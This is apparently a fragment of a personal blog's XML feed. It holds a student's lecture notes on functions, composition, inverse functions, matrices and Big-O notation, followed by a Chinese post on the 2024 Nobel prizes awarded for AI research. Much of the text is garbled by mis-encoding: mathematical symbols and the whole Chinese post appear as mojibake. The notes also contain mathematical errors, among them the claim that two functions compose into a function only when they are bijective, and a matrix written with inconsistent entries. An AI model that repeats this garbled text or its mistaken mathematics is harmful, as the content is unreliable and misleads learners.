â†’ x^2$</p><script type="math/tex; mode=display">f : \{a,...,e\}^âˆ— â†’ \{a,...,e\}^âˆ— \quad with \quad f(w) â†’ awe</script><h2 id="Bijection-functions"><a href="#Bijection-functions" class="headerlink" title="Bijection functions"></a>Bijection functions</h2><p>Both (Inj) and (Suj) functions</p><h2 id="Functions-on-finite-sets"><a href="#Functions-on-finite-sets" class="headerlink" title="Functions on finite sets"></a>Functions on finite sets</h2><p>Take Notice</p><p>For a <strong>finite</strong> set S and $f : S â†’ S$ the properties <strong><code>surjective</code></strong> and <strong><code>injective</code></strong> are equivalent.</p><h1 id="Functional-Composition"><a href="#Functional-Composition" class="headerlink" title="Functional Composition"></a>Functional Composition</h1><p>Q: If $f : S â†’T$ and $g :T â†’U$ are functions, then $f;g$ is a relation. When is it a function?</p><p>A: In the lecture, I said Injective. But Jiaojiao smiled and questioned â€˜Is it sufficient?â€™. The correct answer is â€˜Bijectiveâ€™. </p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>If $f : S â†’T$ and $g :T â†’U$ then the <strong>composition</strong> of f and g, written $gâ—¦f$ , is the function given by</p><script type="math/tex; mode=display">(g â—¦ f)(x) = g(f(x))</script><p>That is, <strong>g â—¦ f</strong> = <strong>f;g</strong>.</p><p><strong>Take note of the order between f and g.</strong> <strong>f;g</strong> means f first and then g, and g â—¦ f is the same of g(f(x)).</p><p>Facts</p><p>Composition is associative</p><p>h â—¦(g â—¦f) = (hâ—¦g)â—¦f</p><p>For $g : S â†’T$ (note the g is different from the g above)</p><script type="math/tex; mode=display">g â—¦Id_S = g \quad and \quad Id_T â—¦g =g</script><p>S-&gt;S-&gt;T and S-&gt;T-&gt;T</p><h2 id="Iteration-of-Functions"><a href="#Iteration-of-Functions" class="headerlink" title="Iteration of Functions"></a>Iteration of Functions</h2><p>If a function maps a set into itself, i.e. when Dom(f) = Codom(f), the function can be composed with itself â€” <strong>iterated</strong></p><script type="math/tex; mode=display">f â—¦f,f â—¦f â—¦f,..., \text{ also written } f^2,f^3, \dots</script><h2 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h2><p>Let $f ,g : \mathbb{Z} â†’ \mathbb{Z}$ be given by $f(n) = n^2 +3$ and $g(n) = 5nâˆ’11$. What is:</p><script type="math/tex; mode=display">fâ—¦g(n) = (5nâˆ’11)^2 +3\\gâ—¦f(n) = 5(n^2+3)-11\\g^2(n) = 5(5n-11)-11</script><h1 id="Inverse-Functions"><a href="#Inverse-Functions" class="headerlink" title="Inverse Functions"></a>Inverse Functions</h1><p>Converse of a function</p><p>Q: If $f : S â†’T$, then $f^\leftarrow$ is a relation; when is it a function?</p><p>A: bijective</p><p>If $f^\leftarrow$ is a function then it is called the <strong>inverse function</strong>; denoted $f^{âˆ’1}$.</p><p>Take Notice</p><p>$f^{âˆ’1}$ only exists if f is a bijection.</p><p>$f^â†$ always exists.</p><p>$f^{âˆ’1}$ is the procedure of â€œundoingâ€ f .</p><p><img src="/2024/10/11/Math/Functions/inverse_definition.png" alt></p><p><img src="/2024/10/11/Math/Functions/inverse_non_fun.png" alt></p><h2 id="Properties-of-the-inverse"><a href="#Properties-of-the-inverse" class="headerlink" title="Properties of the inverse"></a>Properties of the inverse</h2><p>If $f : S â†’T$ and $f^{âˆ’1}$ exists then:</p><script type="math/tex; mode=display">f^{âˆ’1} â—¦f = Id_S \quad and \quad fâ—¦f^{âˆ’1} =Id_T</script><p>Conversely, if $f : S â†’ T \quad and \quad g : T â†’ S$ and</p><script type="math/tex; mode=display">gâ—¦f =Id_S \quad and \quad f â—¦g =Id_T</script><p>then $f^{âˆ’1}$ exists and is equal to g.</p><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Q:<br>f and g are â€˜shiftâ€™ functions $\mathbb{N}â†’\mathbb{N}$ defined by f(n)=n+1, and g(n)=max(0,nâˆ’1)</p><p>(c) Is f injective? surjective?</p><p>A:<br>f(n)=n+1 (Inj) but 0 belongs to the co-domain, and f(n) cannot point 0, so it is not (Sur)</p><p>(d) Is g injective? surjective?</p><p>g(n)=max{0,nâˆ’1}, g(0)=g(1)=0, so g(n) is not (Inj), it is (Suj)</p><p>(e) Do f and g commute, i.e. âˆ€n((fâ—¦g)(n) = (gâ—¦f)(n))?</p><p>f(g(n))=g(n)+1=max{0, n-1}+1=max{1,n}, n belongs to Natural Number. The functionâ€™s result = 1 if n=0; =n if n&gt;=1</p><p>g(f(n))=max{0,n+1-1}=max{0,n}</p><p>Thus f and g donâ€™t commute.</p><hr><p>Q:<br>Î£={a,b,c}</p><p>(c) Is length:$Î£^âˆ—â†’\mathbb{N} \quad surjective$?</p><p>A:Yes, it is (Surj), $\lambda, a, aa, aaa, aaaa, \dots$.</p><p>(d) $length^â†(2)\overset{?}{=}$</p><p>A:{aa,ab,ac,ba,bb,bc,ca,cb,cc}</p><hr><p>Q:<br>Verifythat $f:\mathbb{R} \times \mathbb{R}â†’\mathbb{R} \times \mathbb{R}$ defined by $f(x,y)=(x+y,xâˆ’y)$ is invertible.</p><p>A: to prove the function is bijective.</p><p>$f(x,y)=(x+y,xâˆ’y) invertible \iff bijective (Inj)(Sur)$</p><p>$(Inj)$ suppose f(x,y)=(x+y,xâˆ’y),f(w,v)=(w+v,wâˆ’v)</p><script type="math/tex; mode=display">\begin{cases}  x+y=w+v \\  xâˆ’y=wâˆ’v\end{cases}\implies\begin{cases}  2x=2w \\  2y=2v\end{cases}\implies(x,y)=(w,v)</script><p>$(Sur)$ for any $(m,n) \in \mathbb{R} \times \mathbb{R}$, we need to find (x,y), s.t. f(x,y)=(m,n)</p><p>f(x,y)=(x+y,xâˆ’y)=(m,n)</p><script type="math/tex; mode=display">\implies\begin{cases}  x+y=m \\  xâˆ’y=n\end{cases}\implies\begin{cases}  2x=m+n \\  2y=m-n\end{cases}\implies\begin{cases}  x=\frac{m+n}{2} \\  y=\frac{m-n}{2}\end{cases}</script><p><img src="/2024/10/11/Math/Functions/111.png" alt></p><h1 id="Matrices"><a href="#Matrices" class="headerlink" title="Matrices"></a>Matrices</h1><p>An mÃ—n matrix is a rectangular array with m horizontal rows and n vertical columns.</p><script type="math/tex; mode=display">\begin{matrix}a_{11} & a_{12} & \dots & a_{13} \\a_{21} & a_{22} & \dots & a_{23} \\\vdots & \vdots &  & \vdots \\\a_{31} & a_{32} & \dots & a_{33}\end{matrix}</script><p>Take Notice</p><p>Matrices are important objects in Computer Science, e.g. for</p><ul><li>optimisation</li><li>graphics and computer vision</li><li>cryptography</li><li>information retrieval and web search</li><li>machine learning</li></ul><h2 id="Matrix-Motivation"><a href="#Matrix-Motivation" class="headerlink" title="Matrix Motivation"></a>Matrix Motivation</h2><p>Solvinglinearequations:</p><p>5x=15</p><hr><p>5x+3y = 15 and 4xâˆ’2y = 12</p><script type="math/tex; mode=display">A = \left\{\begin{matrix}5 & 3 \\4 & 2 \\\end{matrix}\right\}</script><script type="math/tex; mode=display">x = \left\{\begin{matrix}x\\y\\\end{matrix}\right\}</script><script type="math/tex; mode=display">b = \left\{\begin{matrix}15\\12\\\end{matrix}\right\}</script><p>hence</p><script type="math/tex; mode=display">Ax=b</script><hr><script type="math/tex; mode=display">x' = 5x+3y \quadx'' = 2x'+y'\\y' = 4xâˆ’2y \quady'' = 3x'+3y'</script><script type="math/tex; mode=display">A = \left\{\begin{matrix}5 & 3 \\4 & -2 \\\end{matrix}\right\}</script><script type="math/tex; mode=display">x = \left\{\begin{matrix}x\\y\\\end{matrix}\right\}</script><script type="math/tex; mode=display">x' = \left\{\begin{matrix}x'\\y'\\\end{matrix}\right\}</script><script type="math/tex; mode=display">B = \left\{\begin{matrix}2 & 1 \\3 & 3 \\\end{matrix}\right\}</script><script type="math/tex; mode=display">x'' = \left\{\begin{matrix}x''\\y''\\\end{matrix}\right\}</script><p>Then how to simultaneous equations?</p><h2 id="Basic-Matrix-Operations"><a href="#Basic-Matrix-Operations" class="headerlink" title="Basic Matrix Operations"></a>Basic Matrix Operations</h2><p>The $transpose A^T$ of an $m \times n$ matrix $A = [a<em>{ij}]$ is the $n \times m$ matrix whose entry in the ith row and jth column is $a</em>{ji}$.</p><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0 & 4 \\3 & 2 & -1 & 2 \\4 & 0 & 1 & 3 \end{bmatrix}</script><script type="math/tex; mode=display">A^T=\begin{bmatrix}2 & 3 & 4 \\-1 & 2 & 0 \\0 & -1 & 1 \\4 & 2 & 3 \\\end{bmatrix}</script><p>Take notice</p><p>A matrix <strong>M</strong> is called <strong>symmetric</strong> if M^T = M</p><h2 id="Matrix-Sum"><a href="#Matrix-Sum" class="headerlink" title="Matrix Sum"></a>Matrix Sum</h2><p>The <strong>sum</strong> of two $m \times n$ matrices $A = [a<em>{ij}]$ and $B = [b</em>{ij}]$ is the $m \times n$ matrix whose entry in the ith row and jth column is $a<em>{ij} +b</em>{ij}$.</p><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0 & 4 \\3 & 2 & -1 & 2 \\4 & 0 & 1 & 3\end{bmatrix}</script><script type="math/tex; mode=display">B=\begin{bmatrix}1 & 0 & 5 & 3 \\2 & 3 & -2 & 1 \\4 & -2 & 0 & 2\end{bmatrix}</script><script type="math/tex; mode=display">A+B=\begin{bmatrix}3 & -1 & 5 & 7 \\5 & 5 & -3 & 3 \\8 & -2 & 1 & 5\end{bmatrix}</script><p>Fact:</p><script type="math/tex; mode=display">A+B=B+A \quad and \quad (A+B)+C=A+(B+C)</script><h2 id="Scalar-Product"><a href="#Scalar-Product" class="headerlink" title="Scalar Product"></a>Scalar Product</h2><p>Given $m \times n$ matrix $A = [a<em>{ij}]$ and $c âˆˆ \mathbb{R}$, the <strong>scalar product</strong> <strong>cA</strong> is the $m \times n$ matrix whose entry in the ith row and jth column is $c Â· a</em>{ij}$.</p><script type="math/tex; mode=display">A=\begin{bmatrix}2 & -1 & 0 & 4 \\3 & 2 & -1 & 2 \\4 & 0 & 1 & 3\end{bmatrix}</script><script type="math/tex; mode=display">2A=\begin{bmatrix}4 & -2 & 0 & 8 \\6 & 4 & -2 & 4 \\8 & 0 & 2 & 6\end{bmatrix}</script><h2 id="Matrix-Product"><a href="#Matrix-Product" class="headerlink" title="Matrix Product"></a>Matrix Product</h2><p>The <strong>product</strong> of an $m \times n$ matrix $A = [a<em>{ij}]$ and an nÃ—p matrix $B=[b</em>{jk}]$ is the $m \times p$ matrix $C = [c_{ik}]$ defined by</p><script type="math/tex; mode=display">c_{ik} = \Sigma^n_{j=1} a_{ij}b_{jk} \quad for \quad 1 â‰¤ i â‰¤ m \quad and \quad 1â‰¤kâ‰¤p</script><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12} \\a_{21} & a_{22} \end{bmatrix}\cdot\begin{bmatrix}b_{11} & b_{12} \\b_{21} & b_{22} \end{bmatrix}=\begin{bmatrix}a_{11}b_{11}+a_{12}b_{21} & a_{11}b_{12}+a_{12}b_{22} \\a_{21}b_{11}+a_{22}b_{21} & a_{21}b_{12}+a_{22}b_{22}\end{bmatrix}</script><p>Take Notice</p><p>The number of <strong>columns</strong> of A must be the same as the number of <strong>rows</strong> of B. (å£è¯€â€œä¸€è¡ŒäºŒåˆ—åç›¸ç­‰â€)</p><p>The product of a $1 \times n$ matrix and an $n \times 1$ matrix is usually called the <strong>inner product</strong> of two <strong>n-dimensional vectors</strong>. One line matrix multiples one column matrix, we could obtain only a number. Note, the 1 means only number 1, it is only a scalar, and n means 1-dimensional vector, just like.</p><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12}\end{bmatrix} \text{ to be the } 1 \times n</script><p> matrix,<br>and </p><script type="math/tex; mode=display">\begin{bmatrix}b_{11}\\b_{21}\end{bmatrix}</script><p>to be the $n \times 1$ matrix. </p><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{21}\end{bmatrix}</script><p>to be the $1 \times n$ matrix.</p><p>Then </p><script type="math/tex; mode=display">\begin{bmatrix}a_{11} & a_{12}\end{bmatrix}</script><p>$\cdot$ </p><script type="math/tex; mode=display">\begin{bmatrix}b_{11}\\b_{21}\end{bmatrix}</script><p>= $a<em>{11}b</em>{11} + a<em>{12}b</em>{21}$</p><p>It is the inner product, which is also resulting in a scalar.</p><p>Consider</p><script type="math/tex; mode=display">A=\begin{bmatrix}1 & 2 \\2 & 4\end{bmatrix}</script><script type="math/tex; mode=display">B=\begin{bmatrix}2 & -1 \\-6 & 3\end{bmatrix}</script><p>Calculate <strong>AB</strong>, <strong>BA</strong></p><script type="math/tex; mode=display">AB=\begin{bmatrix}-10 & 5 \\-20 & 10\end{bmatrix}</script><script type="math/tex; mode=display">BA=\begin{bmatrix}0 & 0 \\0 & 0\end{bmatrix}</script><p>Take Notice</p><p>In general, $A Â· B \neq BÂ·A$</p><h3 id="Computer-Graphics"><a href="#Computer-Graphics" class="headerlink" title="Computer Graphics"></a>Computer Graphics</h3><p>Rotating an object w.r.t. the x axis by degree Î±:</p><p><img src="/2024/10/11/Math/Functions/2024-10-11-18-08-45.png" alt></p><hr><h1 id="Introduction-to-Big-O-Notation"><a href="#Introduction-to-Big-O-Notation" class="headerlink" title="Introduction to Big-O Notation"></a>Introduction to Big-O Notation</h1><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><p>Want to compare functions, particularly functions from $\mathbb{N}$ to $\mathbb{R}$</p><p>Options</p><ul><li>Equality: $f(n) = g(n)$ for all n</li><li>(Pointwise) comparison: $f(n) â‰¤ g(n)$ for all n</li><li>(Almost all) comparison:  $f(n) â‰¤ g(n)$ for all but finitely many n</li><li>Asymptotic growth: $lim_{n-&gt;\infin} \frac{f(n)}{g(n)}$</li></ul><h3 id="example-Algorithmic-analysis"><a href="#example-Algorithmic-analysis" class="headerlink" title="example: Algorithmic analysis"></a>example: Algorithmic analysis</h3><p>Want to compare algorithmsâ€“ particularly ones that can solve arbitrarily large instances.</p><p>We would like to be able to talk about the resources (running time, memory, energy consumption) required by a program/algorithm as a function f (n) of some parameter n (e.g. the size) of its input.</p><p>e.g. How long does a given sorting algorithm take to run on a listof n elements?</p><p>Issues</p><p>The exact resources required for an algorithm are difficult to pin down. Heavily dependent on:</p><ul><li><p>Environment the program is run in (hardware, choice of language, external factors, etc)</p></li><li><p>Choice of inputs used</p></li></ul><p>Cost functions can be complex, e.g.</p><script type="math/tex; mode=display">2n log(n) + (n-100)log(n)^2 + \frac{1}{2^n} log(log(n))</script><p>Need to identify the â€œimportantâ€ aspects of the function.</p><p>Look at the <strong>asymptotic growth</strong>: how do the costs <strong>scale</strong> as n gets large?</p><h2 id="â€œBig-Oâ€-Asymptotic-Upper-Bounds"><a href="#â€œBig-Oâ€-Asymptotic-Upper-Bounds" class="headerlink" title="â€œBig-Oâ€ Asymptotic Upper Bounds"></a>â€œBig-Oâ€ Asymptotic Upper Bounds</h2><p>Definition:</p><p>Let $f,g:\mathbb{N} â†’ \mathbb{R}_{â‰¥0}$. We say that g is asymptotically less than f (or: <em>f is an upper bound of g</em>) if there exists $n_0 \in \mathbb{N}$ and a real constant $c &gt; 0$ such that for all $n â‰¥ n_0$,</p><script type="math/tex; mode=display">g(n) \leq  c \cdot f(n)</script><p>Write O(f(n)) for the class of all functions g that are asymptotically less than f .</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>g(n) = 3n+1 â‡’ g(n)â‰¤4n, for all n â‰¥1</p><p>Therefore, 3n + 1 âˆˆ O(n)</p><script type="math/tex; mode=display">\frac{1}{10} n^2 \in O(n^2) \\10n log n \in O(n log n) \\O(n log n) \nsubseteq O(n^2)</script><p>$O(n log n)$ is different from $O(n^2)$</p><p>Note! The traditional notation has been</p><p><strong>g(n) = O(f(n))</strong></p><p>instead of <strong>g(n) âˆˆ O(f(n))</strong>.</p><p>It allows one to use O(f(n)) or similar expressions as part of an equation; of course these â€˜equationsâ€™ express only an approximate equality. Thus,</p><script type="math/tex; mode=display">T(n) = 2Â·T(\frac{n}{2}) + O(n)</script><p>means  â€œThere exists a function $f (n) âˆˆ O(n)$ such that $T(n) = 2T(\frac{n}{2}) + f(n)$.â€</p><p><img src="/2024/10/11/Math/Functions/BigOh.png" alt></p><h2 id="properties"><a href="#properties" class="headerlink" title="properties"></a>properties</h2><p>Suppose f (n) âˆˆ O(g(n)), g(n) âˆˆ O(h(n)) and j(n) âˆˆ O(k(n)).</p><p>Then:</p><ul><li>f(n) âˆˆ O(h(n))</li><li>f(n) +j(n) âˆˆ O(g(n)+k(n))</li><li>f(n) Â· j(n) âˆˆ O(g(n) Â· k(n))</li></ul><h3 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h3><script type="math/tex; mode=display">5n^2 +3 n+2 âˆˆ O(n^2)\\n^3 +2^{100}n^2 +2n +2^{2^{100}} âˆˆ O(n^3)</script><p>Generally, for constants $a_k â€¦ a_0$,</p><script type="math/tex; mode=display">a_kn^k + a_{k-1}n^{k-1} + \dots + a_0 \in O(n^k)</script><h2 id="â€œBig-Omegaâ€-Asymptotic-Lower-Bounds"><a href="#â€œBig-Omegaâ€-Asymptotic-Lower-Bounds" class="headerlink" title="â€œBig-Omegaâ€ Asymptotic Lower Bounds"></a>â€œBig-Omegaâ€ Asymptotic Lower Bounds</h2><p>Definition</p><p>Let $f,g : \mathbb{N} â†’ \mathbb{R}$. We say that g is asymptotically greater than f (or: <strong>f is an lower bound of g</strong>) if there exists $n_0 âˆˆ \mathbb{N}$ and a real constant c &gt; 0 such that for all $n â‰¥ n_0$</p><script type="math/tex; mode=display">g(n) â‰¥ c Â·f(n)</script><p>Write $\Omega(f(n))$ for the class of all functions g that are asymptotically greater than f.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>g(n) = 3n+1 â‡’ g(n)â‰¥3n, for all n â‰¥1</p><p>Therefore, 3n + 1 âˆˆ â„¦(n)</p><h2 id="â€œBig-Thetaâ€-Notation"><a href="#â€œBig-Thetaâ€-Notation" class="headerlink" title="â€œBig-Thetaâ€ Notation"></a>â€œBig-Thetaâ€ Notation</h2><p>Definition</p><p>Two functions f,g have the same order of growth, or are <strong>asymptotically equivalent</strong>, if they scale up in the same way:<br>There exists $n_0 âˆˆ \mathbb{N}$ and real constants c &gt; 0, d &gt; 0 such that for all $n â‰¥ n_0$,</p><script type="math/tex; mode=display">c Â· f (n) â‰¤ g(n) â‰¤ d Â·f(n)</script><p>Write Î˜(f(n)) for the class of all functions g that have the same order of growth as f .</p><p>If g âˆˆ O(f) (or â„¦(f)) we say that f is an upper bound (lower bound) on the order of growth of g; if g âˆˆ Î˜(f) we call it a <strong>tight bound</strong>.</p><p><img src="/2024/10/11/Math/Functions/2024-10-12-09-24-05.png" alt></p><h3 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h3><p>Observe that, somewhat symmetrically</p><p>gâˆˆÎ˜(f) â‡â‡’ f âˆˆÎ˜(g)</p><p>We obviously have</p><p>Î˜(f(n)) âŠ† O(f(n)) and Î˜(f(n)) âŠ† â„¦(f(n)),</p><p>in fact</p><p>Î˜(f(n)) = O(f(n)) âˆ© â„¦(f(n)).</p><p>At the same time the â€˜Big-Ohâ€™ is not a symmetric relation</p><p>g âˆˆO(f) Ì¸â‡’ f âˆˆO(g),</p><p>but</p><p>g âˆˆO(f) â‡”f âˆˆâ„¦(g)</p><h3 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h3><p>For all k,Ïµ &gt; 0:</p><script type="math/tex; mode=display">O((log n)^k) âŠŠ O(n^Ïµ) \quad and \quad O(n^k) âŠŠ O((1+Ïµ)^n).</script><p>All logarithms have the same order, irrespective of base:</p><script type="math/tex; mode=display">O(log_2 n) = O(log_3n) = ... = O(log_{10}n) = ...</script><p>Exponentials to different bases have different orders:</p><script type="math/tex; mode=display">O(r^n) âŠŠ O(s^n) âŠŠ O(t^n) ... \quad for \quad r < s < t...</script><p>Similarly for polynomials</p><script type="math/tex; mode=display">O(n^k) âŠŠ O(n^l) âŠŠ O(n^m) ... \quad for \quad k < l < m...</script><h4 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h4><p>Here are some of the most common functions occurring in the analysis of the performance of programs (algorithm complexity), arranged in increasing asymptotic growth:</p><script type="math/tex; mode=display">1, log log n, log n, âˆšn, âˆšn(log n), n, n(log log n), nlogn,nâˆšn, n^2, n^2 logn, n^3, n^{12}, 2^{âˆšn}, 1.01^n, 2^n, 3^n, n!, n^n, 2^{n^2},...</script><p>Take Notice</p><p>$O(1) â‰¡ const$, although technically it could be any function that varies between two constants c and d.</p><h4 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises"></a>Exercises</h4><p>Q: True or false?</p><script type="math/tex; mode=display">(a) 2^{n+1}âˆˆO(2^n) \\(b) (n+1)^2 âˆˆ O(n^2) \\(c) 2^{2n} âˆˆ O(2^n) \\(d) (200n)^2 âˆˆ O(n^2) \\(b) log(n^{73})âˆˆO(log n) \\(c) log(n^n) âˆˆ O(log n) \\(d) (âˆšn+1)^4 âˆˆ O(n^2)</script><p>A:<br>TTF-&gt;$O(4^n)$<br>TTFT</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®ºè¯ºå¥–ä¸AI</title>
      <link href="/2024/10/11/trivia/%E8%AE%BAAI/"/>
      <url>/2024/10/11/trivia/%E8%AE%BAAI/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¹´2024å¹´çš„è¯ºè´å°”å¥–æ­å¼€å¸·å¹•ï¼Œç‰©ç†å¥–å’ŒåŒ–å­¦å¥–éƒ½é¢ç»™äº†å‘æ˜AIåè¾…äº¤å‰å­¦ç§‘çš„ç§‘å­¦å®¶ã€‚AIä¹‹çˆ¶æ¥ç”µè¯æ—¶å›ç­”â€œA bolt from the blueâ€ã€‚</p><p>ä»Šå¹´ç§‘å­¦å¥–çš„ç‰©ç†å’ŒåŒ–å­¦éƒ½ç»™äº†äº¤å‰å­¦ç§‘çš„AIè¯¾é¢˜ç ”ç©¶è€…ã€‚</p><h1 id="physics"><a href="#physics" class="headerlink" title="physics"></a>physics</h1><p>for foundational discoveries and inventions that enable machine learning with artificial neural networks</p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-14-42.png" alt="John J. Hopfield"></p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-14-52.png" alt="Geoffrey E. Hinton"></p><h1 id="chemistry"><a href="#chemistry" class="headerlink" title="chemistry"></a>chemistry</h1><p>for protein structure prediction</p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-15-56.png" alt="David Baker"></p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-16-10.png" alt="Demis Hassabis"></p><p><img src="/2024/10/11/trivia/%E8%AE%BAAI/2024-10-11-15-16-18.png" alt="John M. Jumper"></p><hr><p>ç›®å‰çœ‹æ¥ï¼Œäº¤å‰å­¦ç§‘ç¡®å®æ¯”è¾ƒå®¹æ˜“å‡ºæˆç»©ï¼Œä¹Ÿå®¹æ˜“æ‹¿è¯ºå¥–ï¼Œä¸­å›½å›½å†…å¾ˆå¤šåŒå­¦éƒ½åœ¨ç ”ç©¶äº¤å‰å­¦ç§‘ï¼Œç”¨AIè§£å†³å„ç§å„æ ·çš„é—®é¢˜ï¼Œæ¯”å¦‚ç”¨AIåšåŒ»å­¦è¯¾é¢˜ï¼Œè¿˜æ˜¯å¾ˆæœ‰å¸Œæœ›æ‹¿è¯ºå¥–çš„ã€‚</p><h1 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h1><p>ç”±äºäººç±»çš„æ€è€ƒè¿‡ç¨‹å’Œè®¡ç®—æœºç¨‹åºè¿è¡Œå¤§è‡´ç›¸å½“ï¼Œéœ€è¦è¾“å…¥ï¼ˆå¬ã€é˜…è¯»ï¼‰ã€å¤„ç†ï¼ˆæ€è€ƒï¼Œé¢†æ‚Ÿï¼‰ã€è¾“å‡ºï¼ˆè¯´è¯ã€å†™ä½œï¼‰ï¼Œä½†æ˜¯äººç±»çš„IOè¿è¡Œæ—¶é—´å’Œæ•ˆç‡è¿œä½äºè®¡ç®—æœºï¼Œè„‘æœºæ¥å£çš„é—®ä¸–å°†å¸¦æ¥äººç±»IOçš„è§£æ”¾ã€‚æˆ‘æ‰€çœ‹ï¼Œæˆ‘æ‰€æƒ³ï¼Œæˆ‘æ‰€è¨€ï¼Œéƒ½å¾ˆå®¹æ˜“é€šè¿‡è„‘æœºæ¥å£èŠ‚çœIOæ—¶é—´ï¼Œåœ¨ç½‘ç»œä¸Šå’Œåˆ«äººäº¤æµï¼Œè¿›è€Œä¿ƒè¿›äººç±»è§£æ”¾å’Œç¤¾ä¼šè¿›æ­¥ã€‚ä½†æ˜¯ï¼Œäººç±»å†æ€ä¹ˆè§£æ”¾ï¼Œéƒ½æ²¡åŠæ³•éšæ—¶éšåœ°åƒä¸ªç¨‹åºä¸€æ ·ï¼Œå¯¹ä¸€äº›é‡å¤æ€§å¤§çš„å·¥ä½œè¿›è¡Œä¸é—´æ–­çš„åˆ¤æ–­ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤©ç„¶çš„ç¼ºå£ï¼Œäººç±»å†è¿›åŒ–å‡ ä¸‡å¹´ï¼Œä¾ç„¶ä¼šå‡ºç°â€œéœ€è¦æ¯”è¾ƒèªæ˜çš„ä¸œè¥¿åšé‡å¤æ€§çš„å·¥ä½œâ€ã€‚</p><p>AIæ˜¯è§£æ”¾åŠ³åŠ¨åŠ›çš„ä¸å¯æ›¿ä»£çš„ç¼ºå£ã€‚ç›¸æ¯”äººç±»ï¼ŒAIå¯ä»¥æŒç»­çš„åšå‡ºæ¯”è¾ƒèªæ˜ã€æ™ºæ…§çš„åˆ¤æ–­ã€‚è¯¸å¦‚ã€Šä¸‰ä½“ã€‹æ‰€è¨€ï¼Œæœªæ¥å¤ªç©ºèˆ°é˜Ÿçš„ä½œæˆ˜æ—¶é—´ä»¥â€œç§’â€ä¸ºå•ä½ï¼Œäººç±»ä¸å¯èƒ½é€šè¿‡å£å£ç›¸ä¼ æ¥æŒ‡æŒ¥è¶…å¤§è§„æ¨¡èˆ°é˜Ÿï¼Œåªæœ‰AIå……åˆ†å‘å±•ï¼Œæ‰æœ‰å¯èƒ½è¿›è¡Œæœªæ¥çš„å»ºè®¾ã€æŒ‡æŒ¥ã€è¶…å¤æ‚æœºå™¨çš„è¿è¡Œç»´æŠ¤ã€‚</p><h1 id="æ„Ÿè¨€"><a href="#æ„Ÿè¨€" class="headerlink" title="æ„Ÿè¨€"></a>æ„Ÿè¨€</h1><p>1.äººç±»æ— æ³•æ‹’ç»AIï¼Œè°æ‹’ç»AIè°å°±æ˜¯åäººç±»ã€‚</p><p>2.AIéœ€è¦é“å¾·ç›‘ç£ï¼Œå¿…é¡»åŸ¹å…»å¥åº·æˆé•¿çš„AIã€‚</p><p>3.ç°åœ¨çš„å¤§é¢„è¨€æ¨¡å‹ç­‰AIç®—æ³•ä¾ç„¶æœ‰è¿›æ­¥ç©ºé—´ï¼Œåªèƒ½å¤„ç†åŸºæœ¬çš„æ–‡å­—ä¿¡æ¯ã€ä»£ç æ’°å†™ï¼Œä½†æ˜¯å†é«˜çº§ç‚¹çš„äº‹æƒ…å¯èƒ½ä¸å¤ªå¥½åšã€‚å¿…é¡»å¤šç ”ç©¶ä¸‹æ•°å­¦ï¼Œæœ‰ä¿¡æ¯åšä¸€ä¸ªæ›´é«˜çº§çš„AIã€‚</p><p>4.å¯æƒœä¸­å›½è¿˜æ˜¯æ²¡æœ‰å†è·è¯ºè´å°”ç§‘å­¦å¥–ï¼Œè¿™å±Šè¯ºå¥–ç§‘å­¦å¥–åŸºæœ¬éƒ½æ˜¯ç¾å›½äººã€‚å¦‚æœé€‰æ‹©åšç ”ç©¶ï¼Œè¿˜æ˜¯å°½é‡èƒ½ç•™åœ¨å›½å¤–å°±ç•™åœ¨å›½å¤–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªæˆ‘åæ§½</title>
      <link href="/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/"/>
      <url>/2024/10/10/trivia/%E8%87%AA%E6%88%91%E6%89%B9%E8%AF%84/</url>
      
